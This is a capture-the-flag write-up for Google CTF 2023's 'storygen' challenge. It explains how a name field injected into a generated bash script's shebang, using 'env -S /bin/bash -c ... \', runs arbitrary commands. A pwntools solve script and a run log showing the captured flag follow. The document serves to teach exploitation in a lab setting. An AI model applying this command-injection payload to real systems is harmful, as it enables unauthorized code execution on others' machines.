# STORYGEN
## Description
I wrote a story generator. It's still work in progress, but you can check it out.
## Attachments and official writeup
[https://github.com/google/google-ctf/tree/54f15c51f4b0267288f42274e8064fb2603da2ab/2023/pwn-storygen](https://github.com/google/google-ctf/tree/54f15c51f4b0267288f42274e8064fb2603da2ab/2023/pwn-storygen)
## Solution
1. by auditing the `chal.py`, we can write arbitrary string into shebang of bash script(started with `!` to form a `#!`).  
2. but due to the apostrophe of `'s story`, we can't just use `!/bin/ls` nor `!/bin/cat flag.txt`.  
3. Also, we can't use `bash -c` directly, because bash will turn to IO mode(read the file directly without -c mode) in shebang.  
4. Therefore, we can use `env -S bash -c` to bypass this.  
5. Then, use `\` in the end to disable the apostrophe.  
6. Because there is no flag under `/home/user`, I use `ls`(`!/bin/env -S /bin/bash -c "ls" \`) to locate the flag
7. The flag is in the root directory
8. `!/bin/env -S /bin/bash -c "/get_flag Give flag please" \`  

Solve.py  
```python
# -*- coding: utf-8 -*-
from pwn import *

conn = remote("storygen.2023.ctfcompetition.com", 1337)
print(conn.recvuntil(b"What's your name?"))
# b"!/bin/env -S /bin/bash -c \"ls\" \\" : chal.py
# b"!/bin/env -S /bin/bash -c \"ls ..\" \\" : user
# b"!/bin/env -S /bin/bash -c \"ls /\" \\" : bin boot dev etc flag get_flag home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
# b"!/bin/env -S /bin/bash -c \"cat /flag\" \\" : To get the flag, run "/get_flag Give flag please"
conn.sendline(b"!/bin/env -S /bin/bash -c \"/get_flag Give flag please\" \\")
print(conn.recvuntil(b"Where are you from?"))
conn.sendline(b"a")
print(conn.recvuntil(b"Do you want to hear the personalized, procedurally-generated story?"))
conn.sendline(b"yes")
print(conn.recvuntil(b"Do you want to hear the personalized, procedurally-generated story?").decode())
conn.sendline(b"no")
conn.close()
```
Logs:  
```
[x] Opening connection to storygen.2023.ctfcompetition.com on port 1337
[x] Opening connection to storygen.2023.ctfcompetition.com on port 1337: Trying 34.78.214.60
[+] Opening connection to storygen.2023.ctfcompetition.com on port 1337: Done
b"== proof-of-work: disabled ==\nWelcome to a story generator.\nAnswer a few questions to get started.\n\nWhat's your name?"
b'\nWhere are you from?'
b'\nDo you want to hear the personalized, procedurally-generated story?'



CTF{Sh3b4ng_1nj3cti0n_ftw}


Do you want to hear the personalized, procedurally-generated story?
[*] Closed connection to storygen.2023.ctfcompetition.com port 1337
```